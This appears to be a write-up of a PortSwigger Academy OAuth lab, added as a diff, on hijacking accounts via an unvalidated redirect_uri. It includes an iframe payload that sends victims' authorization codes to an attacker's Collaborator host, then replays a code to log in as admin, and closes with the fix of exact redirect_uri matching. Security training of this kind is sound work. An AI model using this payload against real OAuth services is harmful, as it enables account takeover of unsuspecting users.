@@ -1,0 +1,119 @@
+
+
+Lab-03: OAuth account hijacking via redirect_uri
+This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.
+Flaw - No validation on the redirect_uri
+
+Login to the application using the given credentials, intercept the request, copy the URL which has the redirect_uri parameter and replace the uri with bur pcollaborator as shown below. Send it to victim. Once the victim clicks on the link the code will be received on the collaborator server. 
+<iframe src="https://oauth-0ad600f7043848d8803783ee0239002b.oauth-server.net/auth?client_id=ipfwqn5qhat136pbjs9yd&redirect_uri=https://u1w7ajb7ezat4h71elnj05elnct3ht5i.oastify.com/oauth-callback&response_type=code&scope=openid%20profile%20email">
+
+After the code is received, intercept the request and replace the code in the URL https://0a72000d0478487f806c85a900410019.web-security-academy.net/oauth-callback?code=HvK_91d5V9kFhQyaMeccOkCAwYTRte7DMiCPPTqvNRO 
+Notice that the admin panel is available. Click on it and delete the user carlos and the lab is solved.
+
+===================================================================================================
+
+# Lab 03 — OAuth Account Hijacking via redirect_uri
+
+**Difficulty:** Practitioner
+
+---
+
+## What's going on in this lab
+
+The app lets users log in via a social media account using OAuth. The problem is the OAuth server doesn't bother checking whether the `redirect_uri` in the authorization request is actually a registered callback URL. So if you swap it out with a URL you control, the server will just... send the victim's authorization code there. Once you have that code, you can use it to log in as them.
+
+---
+
+## A bit of background before jumping in
+
+When a user logs in through OAuth, the flow roughly goes like this:
+
+1. The app sends the user to the OAuth server with a `redirect_uri` parameter — this is where the code should be sent after the user approves access.
+2. The user approves, and the OAuth server issues an authorization code to that URI.
+3. The app receives the code and exchanges it for an access token to complete the login.
+
+In a properly configured setup, the OAuth server should only accept `redirect_uri` values that were registered by the client when the app was set up. This lab skips that check entirely, which is what makes the attack possible.
+
+---
+
+## Walkthrough
+
+### 1. Capture the OAuth authorization request
+
+Open the lab and click on **My Account**, then go through the social login flow. Make sure Burp Suite is running with intercept on. You'll catch a GET request going to the OAuth server that looks something like this:
+
+```
+https://oauth-<lab-id>.oauth-server.net/auth
+  ?client_id=<client_id>
+  &redirect_uri=https://<lab-id>.web-security-academy.net/oauth-callback
+  &response_type=code
+  &scope=openid%20profile%20email
+```
+
+Hold onto this — you're going to modify the `redirect_uri` part.
+
+### 2. Set up Burp Collaborator
+
+Go to **Burp > Burp Collaborator** and copy your Collaborator URL. It'll look something like `https://xxxx.oastify.com`. This is the server that will receive the stolen code when the victim clicks your link.
+
+### 3. Build the malicious link
+
+Take the OAuth URL from step 1 and replace the `redirect_uri` with your Collaborator URL, appending `/oauth-callback` at the end:
+
+```
+https://oauth-<lab-id>.oauth-server.net/auth
+  ?client_id=<client_id>
+  &redirect_uri=https://<your-collaborator>.oastify.com/oauth-callback
+  &response_type=code
+  &scope=openid%20profile%20email
+```
+
+Now wrap it in an iframe so it fires silently when the victim loads the page — no click needed:
+
+```html
+<iframe src="https://oauth-<lab-id>.oauth-server.net/auth?client_id=<client_id>&redirect_uri=https://<your-collaborator>.oastify.com/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>
+```
+
+The reason this works silently is that the victim already has an active session on the OAuth server. When their browser loads the iframe, the OAuth server sees an authenticated user, auto-approves the flow, and sends their authorization code straight to your Collaborator server.
+
+### 4. Deliver the exploit
+
+Head to the **Exploit Server** in the lab. Drop the iframe into the body field and hit **Deliver Exploit to Victim**.
+
+### 5. Grab the authorization code
+
+Switch over to Burp Collaborator and click **Poll Now**. You should see an incoming request — check the path, it'll have the code in it:
+
+```
+GET /oauth-callback?code=<stolen_code>
+```
+
+Copy that code.
+
+### 6. Use the code to log in as admin
+
+Turn intercept off in Burp, then paste this into your browser:
+
+```
+https://<lab-id>.web-security-academy.net/oauth-callback?code=<stolen_code>
+```
+
+You'll be logged in as the administrator.
+
+### 7. Delete carlos
+
+The Admin Panel will be visible once you're in. Open it, find **carlos**, and delete the account. Lab done.
+
+---
+
+## Why this works (and how to prevent it)
+
+The root cause is that the OAuth server accepts any `redirect_uri` without checking it against a whitelist of approved callback URLs. The fix is straightforward — during client registration, the app should register its exact callback URL(s), and the OAuth server should reject any authorization request where the `redirect_uri` doesn't match exactly. Even a partial match check (e.g., just validating the domain) can be bypassed with open redirects, so exact matching is the right approach.
+
+---
+
+## References
+
+- https://portswigger.net/web-security/oauth
+- https://datatracker.ietf.org/doc/html/rfc6749
+- https://datatracker.ietf.org/doc/html/rfc6819
